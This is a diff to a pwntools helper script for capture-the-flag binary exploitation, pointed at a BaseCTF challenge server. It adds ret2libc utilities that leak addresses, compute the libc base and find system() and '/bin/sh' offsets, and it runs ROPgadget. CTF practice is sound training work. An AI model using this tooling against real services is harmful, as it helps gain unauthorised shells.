@@ -2,9 +2,9 @@ from pwn import *
 from LibcSearcher import *
 import os
 
-dir = ''
-file = './hacknote'
-libc_target = './libc-2.23.so'
+dir = 'challenge.basectf.fun:49932'
+file = './attachment'
+libc_target = './libc.so.6'
 
 elf_state = True
 libc_state = True
@@ -43,12 +43,13 @@ except:
 
 def answer(name, data = None, item = None):
     type_data = isinstance(data,str)
+    type_name = isinstance(name,str)
     if name == 'offest' or name == 'padding':
         if item is None:
             success(name + ': ' + hex(data) + '=' + str(data))
         else:
             success(name + ': ' + hex(data) + '=' + str(data) + '\t(' + item + ')')
-    elif name == 'success' or name == 'error' or name == 'done':
+    elif type_name == True and data == None and item == None:
         success(name)
     else:
         if type_data == True:
@@ -73,13 +74,22 @@ def p6(text):
 def p3(text):
     return p32(text)
 
-def data_recv_test():
-    p.recv()
-    p.recv()
+def data_recv_test(times = None,out = None):
+    if out == None:
+        if times == None:
+            p.recv()
+        else:
+            for i in range(times):
+                p.recvline()
+    else:
+        data = int(p.recvline()[2:-1],16)
+        return data
 
-def data_recv(name,type = None):
-    #only ret2libc
-    data = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
+def data_recv(name,type):
+    if type == 64:
+        data = u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
+    if type == 32:
+        data = u32(p.recv(4))
     answer(name,data)
     return data
 
@@ -87,33 +97,37 @@ def libc_compute(name,name_add,mode = None):
     #only ret2libc
     global system_add
     global binsh_add
-    if libc_state == False or mode != 'local':
+    if libc_state == False and mode != 'local':
+        answer('libc is open')
         libc = LibcSearcher(name,name_add)
         libc_base = name_add - libc.dump(name)
         binsh_add = libc_base + libc.dump('str_bin_sh')
         system_add = libc_base + libc.dump('system')
+        answer('libc_base',libc_base)
+    elif libc_target == False or mode == 'local':
+        answer('lib is open')
+        global lib
+        lib = elf.libc
+        lib.add = name_add - lib.sym[name]
+        system_add = lib.sym['system']
+        binsh_add = next(lib.search(b'/bin/sh'))
+        answer('libc_base',lib.address)
     else:
+        answer('libc is open')
         libc = ELF(libc_target)
         libc_base = name_add - libc.sym[name]
         system_add = libc_base + libc.sym['system']
         binsh_add = libc_base + get_binsh_offest()
-    answer('libc_base',libc_base)
+        answer('libc_base',libc_base)
     answer('system_add',system_add)
     answer('binsh_add',binsh_add)
 
 def get_binsh_offest():
-    shell = 'xxd ' + libc_target + ' |grep "2f 6269 6e2f 7368 00"'
-    data = os.popen(shell).readlines()[0].strip(' ')
-    libc_base,data= data.split(':')
-    libc_base = int(libc_base,16)
-    data = data[1:data.rindex(' ')]
-    out = ''
-    for i in data.split(' '):
-        i = i[:2] + ' ' + i[-2:] + ' '
-        out += i
-    offest = out.index('2f 62 69 6e 2f 73 68 00')//3
-    offest = offest + libc_base
+    with open('libc.so.6','rb') as file:
+        data = file.read()
+    offest = data.find(b'\x2f\x62\x69\x6e\x2f\x73\x68\x00')
     answer('offest',offest)
+    file.close()
     return offest
 
 answer('elf_state',elf_state)
@@ -143,4 +157,12 @@ if elf_state == True:
     shell = 'ROPgadget --binary ' + file[2:] + ' --only "pop|ret"'
     os.system(shell)
 
+def options(number):
+    if header == '':
+        p.recv()
+    else:
+        p.recvuntil(':')
+    p.sendline(str(number))
+
 context(os='linux', arch='amd64',log_level = 'debug')
+header = ''
